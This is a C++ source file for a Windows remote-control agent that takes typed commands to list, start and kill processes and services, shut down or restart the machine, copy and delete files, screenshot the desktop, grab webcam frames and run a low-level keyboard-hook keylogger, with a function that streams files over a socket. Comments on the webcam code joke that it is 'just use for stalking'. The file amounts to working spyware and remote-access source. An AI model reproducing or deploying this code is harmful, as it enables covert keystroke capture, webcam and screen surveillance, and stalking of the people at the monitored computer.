#include "utils.h"

VideoCapture* cap = nullptr;
HHOOK hHook = NULL;
atomic<bool> keepKeyloggerRunning;
ofstream fo;
stringstream inp, out;
string keyloggerCapturePath = filesystem::current_path().string() + "/keylogger.txt";
string webcamCapturePath = filesystem::current_path().string() + "/webcam.png";
string screenCapturePath = filesystem::current_path().string() + "/screen.png";

// Return a map of command to corresponding handler
map<string, map<string, function<void()>>> setupHandlers() {
    return {
        {
            "list", 
            {
                { "app", listProcesses },
                { "service", listServices }
            }
        },
        {
            "start",
            {
                {
                    "app", 
                    [] {
                        string appName;
                        inp >> appName;
                        if (appName == "") throw bad_function_call();
                        startApp(const_cast<wchar_t*>(wstring(appName.begin(), appName.end()).c_str()));
                    }
                },
                {
                    "service",
                    [] {
                        string serviceName;
                        inp >> serviceName;
                        if (serviceName == "") throw bad_function_call();
                        startServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
                    }
                },
                {
                    "camera", startCamera
                },
                {
                    "keylogger", startKeylogger
                }
            }
        },
        {
            "stop",
            {
                {
                    "app", 
                    [] {
                        unsigned long procID;
                        inp >> procID;
                        if (procID == 0) throw bad_function_call();
                        stopApp(procID);
                    }
                },
                {
                    "service",
                    [] {
                        string serviceName;
                        inp >> serviceName;
                        if (serviceName == "") throw bad_function_call();
                        stopServiceByName(wstring(serviceName.begin(), serviceName.end()).c_str());
                    }
                },
                {
                    "camera", stopCamera
                },
                {
                    "keylogger", stopKeylogger
                }
            }
        },
        {
            "power",
            {
                { "shutdown", shutdownMachine },
                { "restart", restartMachine }
            }
        },
        {
            "file",
            {
                {
                    "copy",
                    [] {
                        string srcPath, desPath;
                        inp >> srcPath >> desPath;
                        if (srcPath == "" || desPath == "") throw bad_function_call();
                        copyFile(wstring(srcPath.begin(), srcPath.end()).c_str(), wstring(desPath.begin(), desPath.end()).c_str());
                    }
                },
                {
                    "delete",
                    [] {
                        string filePath;
                        inp >> filePath;
                        if (filePath == "") throw bad_function_call();
                        deleteFile(wstring(filePath.begin(), filePath.end()).c_str());
                    }
                }
            }
        },
        {
            "capture", 
            {
                { "screen", captureScreen }
            }
        }
    };
}

string getInstruction() {
    stringstream ins;
    ins << "o--------------------- INSTRUCTIONS ---------------------o\n"
        << "|                                                        |\n"
        << "|   list    [app|service]                                |\n"
        << "|   start   [app|service]      [appPath|serviceName]     |\n"
        << "|   stop    [app|service]      [processID|serviceName]   |\n"
        << "|   power   [shutdown|restart]                           |\n"
        << "|   file    [copy|delete]      srcPath [desPath]         |\n"
        << "|   capture screen                                       |\n"
        << "|   start   [camera|keylogger]                           |\n"
        << "|   stop    [camera|keylogger]                           |\n"
        << "|   exit                                                 |\n"
        << "|                                                        |\n"
        << "o--------------------------------------------------------o\n";
    return ins.str();
}

void listProcesses() {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    out << "\n Process ID | " << setw(26) << right << "Executable\n";
    out << string(12, '-') << "o" << string(40, '-') << endl;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            wstring executeFileName(entry.szExeFile);
            out << setw(11) << right << entry.th32ProcessID << " | " 
                << string(executeFileName.begin(), executeFileName.end()) << endl;
        } while (Process32NextW(snapshot, &entry));
    }
    else {
        out << "\nFailed to list processes.\n";
    }
    CloseHandle(snapshot);
}

void startApp(LPWSTR appPath) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, appPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        out << "\nProcess started successfully.\n";
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        out << "\nFailed to start process.\n";
    }
}

void stopApp(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
    if (hProcess) {
        if (TerminateProcess(hProcess, 0)) {
            out << "\nProcess stopped successfully.\n";
        }
        else {
            out << "\nFailed to stop process.\n";
        }
        CloseHandle(hProcess);
    }
    else {
        out << "\nFailed to open process.\n";
    }
}

void listServices() {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scmHandle) {
        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
        return;
    }
    
    DWORD bytesNeeded = 0, servicesCount = 0, resumeHandle = 0;
    EnumServicesStatusW(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, nullptr, 0, &bytesNeeded, &servicesCount, &resumeHandle);

    vector<BYTE> buffer(bytesNeeded);
    ENUM_SERVICE_STATUS* serviceStatus = reinterpret_cast<ENUM_SERVICE_STATUS*>(buffer.data());
    if (!EnumServicesStatusW(scmHandle, SERVICE_WIN32, SERVICE_STATE_ALL, serviceStatus, bytesNeeded, &bytesNeeded, &servicesCount, &resumeHandle)) {
        out << "\nEnumServicesStatus failed with error: " << GetLastError() << endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    out << "\n" << setw(31) << right << "Service Name" << setw(22) << " | " << setw(57) << "Display Name" << setw(54) << " |  Status\n";
    out << string(51, '-') << "o" << string(102, '-') << "o" << string(10, '-') << endl;
    for (DWORD i = 0; i < servicesCount; ++i) {
        wstring serviceName(serviceStatus[i].lpServiceName), displayName(serviceStatus[i].lpDisplayName);
        out << setw(50) << left << string(serviceName.begin(), serviceName.end()) << " | " 
            << setw(100) << string(displayName.begin(), displayName.end()) << " | " 
            << (serviceStatus[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped") << endl;
    }
    
    CloseServiceHandle(scmHandle);
}

void startServiceByName(LPCWSTR serviceName) {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scmHandle) {
        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
        return;
    }

    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName, SERVICE_START);
    if (!serviceHandle) {
        out << "\nOpenService failed with error: " << GetLastError() << endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    if (!StartServiceW(serviceHandle, 0, nullptr)) {
        out << "\nStartService failed with error: " << GetLastError() << endl;
    }
    else {
        out << "\nService started successfully." << endl;
    }
    
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

void stopServiceByName(LPCWSTR serviceName) {
    SC_HANDLE scmHandle = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scmHandle) {
        out << "\nOpenSCManager failed with error: " << GetLastError() << endl;
        return;
    }

    SC_HANDLE serviceHandle = OpenServiceW(scmHandle, serviceName, SERVICE_STOP);
    if (!serviceHandle) {
        out << "\nOpenService failed with error: " << GetLastError() << endl;
        CloseServiceHandle(scmHandle);
        return;
    }

    SERVICE_STATUS status;
    if (!ControlService(serviceHandle, SERVICE_CONTROL_STOP, &status)) {
        out << "\nControlService failed with error: " << GetLastError() << endl;
    }
    else {
        out << "\nService stopped successfully." << endl;
    }

    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);
}

void shutdownMachine() {
    if (!enableShutdownPrivilege()) {
        return;
    }

    const wchar_t* shutdownMessage = L"System is shutting down for maintenance.";
    DWORD shutdownReason = SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED;

    if (InitiateSystemShutdownExW(NULL, (LPWSTR)shutdownMessage, SHUTDOWN_DELAY, TRUE, FALSE, shutdownReason)) {
        out << "\nShutdown initiated successfully. This machine will shutdown after " << SHUTDOWN_DELAY << " seconds.\n";
    }
    else {
        out << "\nFailed to initiate shutdown.\n";
    }
}

void restartMachine() {
    if (!enableShutdownPrivilege()) {
        return;
    }

    const wchar_t* restartMessage = L"System is restarting for maintenance.";
    DWORD restartReason = SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_MAINTENANCE | SHTDN_REASON_FLAG_PLANNED;

    if (InitiateSystemShutdownExW(NULL, (LPWSTR)restartMessage, SHUTDOWN_DELAY, TRUE, TRUE, restartReason)) {
        out << "\nRestart initiated successfully. This machine will restart after " << SHUTDOWN_DELAY << " seconds.\n";
    }
    else {
        out << "\nFailed to initiate restart.\n";
    }
}

void copyFile(LPCWSTR src, LPCWSTR dest) {
    if (CopyFileW(src, dest, FALSE)) {
        out << "\nFile copied successfully.\n";
    }
    else {
        out << "\nFailed to copy file.\n";
    }
}

void deleteFile(LPCWSTR filePath) {
    if (DeleteFileW(filePath)) {
        out << "\nFile deleted successfully.\n";
    }
    else {
        out << "\nFailed to delete file.\n";
    }
}

void captureScreen() {
    // Get the desktop device context (DC)
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Use device-independent pixels (DPI scaling) to get the actual screen resolution
    HDC hdc = GetDC(NULL);
    int screenWidth = GetDeviceCaps(hdc, DESKTOPHORZRES);  // Actual width in pixels
    int screenHeight = GetDeviceCaps(hdc, DESKTOPVERTRES); // Actual height in pixels

    // Create a compatible bitmap for the screen DC
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    SelectObject(hMemoryDC, hBitmap);

    // Copy the screen content to the memory DC
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    // Convert the HBITMAP to a Mat
    BITMAP bmp;
    GetObjectW(hBitmap, sizeof(BITMAP), &bmp);

    // Prepare the OpenCV Mat structure
    Mat mat(screenHeight, screenWidth, CV_8UC4);  // 4 channels: BGRA format

    // Copy the bitmap data into the OpenCV Mat
    GetBitmapBits(hBitmap, bmp.bmHeight * bmp.bmWidthBytes, mat.data);

    // Clean up
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hdc);
    ReleaseDC(NULL, hScreenDC);

    // Convert BGRA to BGR (OpenCV default color format)
    Mat bgrMat;
    cvtColor(mat, bgrMat, COLOR_BGRA2BGR);

    // Check if the capture was successful
    if (!bgrMat.empty()) {
        // Save the captured screen to a file
        if (imwrite(screenCapturePath, bgrMat)) {
            out << "\nCapture screen successfuly.\n\nSee more in file " << screenCapturePath.substr(screenCapturePath.find_last_of("/") + 1);
        }
        else {
            out << "\nFailed to save the screenshot.\n";
        }
    }
    else {
        out << "\nFailed to capture screen.\n";
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKBDLLHookStruct = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            // Get the virtual key code
            UINT vkCode = pKBDLLHookStruct->vkCode;

            // Prepare buffer for the key name
            vector<wchar_t> keyName(256);

            // Print the key name if the result is positive
            BYTE keyboardState[256];
            if (GetKeyboardState(keyboardState)) {
                int result = ToUnicodeEx(vkCode, 0, keyboardState, keyName.data(), keyName.size(), 0, GetKeyboardLayout(0));
                if (result > 0 && 32 <= vkCode && vkCode < 126) {
                    fo.write((const char*)keyName.data(), result);
                    fo << " ";
                }
                else {
                    fo << vkCode << " ";
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void KeyloggerThread() {
    // Set the hook for the keyboard
    hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
    
    // Message loop to keep the hook alive
    MSG msg;
    while (keepKeyloggerRunning) {
        // Check for messages with a timeout
        if (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        else {
            // Sleep to avoid busy waiting
            this_thread::sleep_for(chrono::milliseconds(10));
        }
    }

    // Unhook when done
    UnhookWindowsHookEx(hHook);
}

void startKeylogger() {
    fo.open(keyloggerCapturePath);
    keepKeyloggerRunning = true;
    thread keyloggerThread(KeyloggerThread);
    keyloggerThread.detach(); // Detach the thread to run independently
    out << "\nKeylogger started successfully.\n";
}

void stopKeylogger() {
    keepKeyloggerRunning = false;
    // Post a message to wake up the message loop
    PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
    out << "\nKeylogger stopped successfully.\n\nSee more in file " << keyloggerCapturePath.substr(keyloggerCapturePath.find_last_of("/") + 1);
    fo.close();
}

void startCamera() {
    cap = new VideoCapture(0);
    cap->set(cv::CAP_PROP_FRAME_WIDTH, 1280);
    cap->set(cv::CAP_PROP_FRAME_HEIGHT, 720);
    
    Mat frame;
    *cap >> frame;
    imwrite(webcamCapturePath, frame); // Just use for stalking =))

    if (cap->isOpened()) {
        out << "\nWebcam opened successfully.\n\nSee more in file " << webcamCapturePath.substr(webcamCapturePath.find_last_of('/') + 1);
    }
    else {
        out << "\nFailed to open webcam.\n";
    }
}

void stopCamera() {
    if (cap && cap->isOpened()) {
        Mat frame;
        *cap >> frame;
        imwrite(webcamCapturePath, frame); // Just use for stalking =))
        
        cap->release();
        destroyAllWindows();
        out << "\nWebcam closed successfully.\n\nSee more in file " << webcamCapturePath.substr(webcamCapturePath.find_last_of('/') + 1);
    }
    else {
        out << "\nError: Webcam is not open.\n";
    }
}

void sendFile(CSocket& socket, const string& filePath) {
    CFile file;
    if (file.Open(wstring(filePath.begin(), filePath.end()).c_str(), CFile::modeRead)) {
        CSocketFile socketFile(&socket);
        CArchive archive(&socketFile, CArchive::store);

        unsigned char buffer[BUFFER_SIZE];
        UINT bytesRead;
        while ((bytesRead = file.Read(buffer, sizeof(buffer)))) {
            archive.Write(buffer, bytesRead);
        }
        archive.Flush();
        file.Close();
    }
}

bool enableShutdownPrivilege() {
    HANDLE token;
    TOKEN_PRIVILEGES tkp;

    // Open a handle to the process's access token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        out << "\nFailed to open process token. Error: " << GetLastError() << endl;
        return 0;
    }

    // Look up the LUID for the shutdown privilege
    if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
        out << "\nFailed to lookup privilege value. Error: " << GetLastError() << endl;
        CloseHandle(token);
        return 0;
    }

    tkp.PrivilegeCount = 1;  // We are enabling one privilege
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token's privileges to enable shutdown privilege
    if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
        out << "\nFailed to adjust token privileges. Error: " << GetLastError() << endl;
        CloseHandle(token);
        return 0;
    }

    CloseHandle(token);
    return 1;
}